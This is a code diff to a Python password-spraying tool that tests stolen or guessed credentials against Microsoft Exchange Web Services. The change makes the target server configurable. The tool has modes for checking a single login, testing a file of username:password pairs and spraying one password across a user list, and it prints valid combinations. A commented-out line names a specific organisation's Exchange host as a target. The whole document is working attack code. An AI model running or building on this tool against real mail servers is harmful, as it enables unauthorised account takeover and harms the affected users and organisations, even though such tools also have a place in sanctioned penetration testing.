@@ -52,17 +52,18 @@ def _new_user_agent(name=False):
 requests.utils.default_user_agent = _new_user_agent
 
 
-def ews_config_setup(user, password, domain):
+def ews_config_setup(user, password, domain, exchserver):
 
     try:
         config = Configuration(
-            server='outlook.office365.com', ## need to change this to something like: server="{}".format(exchserver)
+            #server='hybrid.berkshirebank.com',
+            server="{}".format(exchserver),
             credentials=Credentials(
                 username="{}@{}".format(user, domain),
                 password=password))
 
         account = Account(
-            "{}@{}".format(user, domain), ## Removed the 'primary_smtp_address=' because a password may be correct but will return false-negative if the user doesn't have an SMTP mailbox
+            "{}@{}".format(user, domain),
             autodiscover=False,
             config=config,
             access_type=DELEGATE)
@@ -78,29 +79,30 @@ def ews_config_setup(user, password, domain):
     return account, config
 
 
-def test_single_mode(domain, username, password):
-    account, config = ews_config_setup(username, password, domain)
+def test_single_mode(domain, username, password, exchserver):
+    account, config = ews_config_setup(username, password, domain, exchserver)
     if account is None and config is None:
         return False
+
+    #next(iter(account.inbox.all()))
     else:
-    #next(iter(account.inbox.all())) ## Prone to false-negatives, password may be correct but user doesn't have a mailbox
         return True
 
 
-def multi_account_test(domain, filename):
+def multi_account_test(domain, filename, exchserver):
 
     with open(filename) as credentials:
         for line in credentials:
             username, password = line.split(":")
-            valid = test_single_mode(domain, username, password.rstrip('\r\n'))
+            valid = test_single_mode(domain, username, password.rstrip('\r\n'), exchserver)
             if valid:
                 print("Valid combo found {}:{}".format(username, password.rstrip('\r\n')))
 
 
-def spray_and_pray(domain, filename, password):
+def spray_and_pray(domain, filename, password, exchserver):
     with open(filename) as userlist:
         for user in userlist:
-            valid = test_single_mode(domain, user.rstrip('\r\n'), password)
+            valid = test_single_mode(domain, user.rstrip('\r\n'), password, exchserver)
             if valid:
                 print("Valid combo found {}:{}".format(user.rstrip('\r\n'), password))
 
@@ -111,7 +113,8 @@ def spray_and_pray(domain, filename, password):
 @click.option('--domain')
 @click.option('--username')
 @click.option('--password')
-def main(mode, domain, username=None, password=None, filename=None):
+@click.option('--exchserver')
+def main(mode, domain, exchserver, username=None, password=None, filename=None):
 
     leetsauce = """
   ____|  \ \        /    ___|        ___|                         |    
@@ -127,16 +130,16 @@ def main(mode, domain, username=None, password=None, filename=None):
 
     if mode == 'single':
         print("Single account mode selected")
-        valid = test_single_mode(domain, username, password)
+        valid = test_single_mode(domain, username, password, exchserver)
         print("Valid password" if valid else "Invalid password")
 
     if mode == 'creds':
         print("Credential file testing selected")
-        multi_account_test(domain, filename)
+        multi_account_test(domain, filename, exchserver)
 
     if mode == 'spray':
         print("Spray and pray mode")
-        spray_and_pray(domain, filename, password)
+        spray_and_pray(domain, filename, password, exchserver)
 
 
 if __name__ == "__main__":
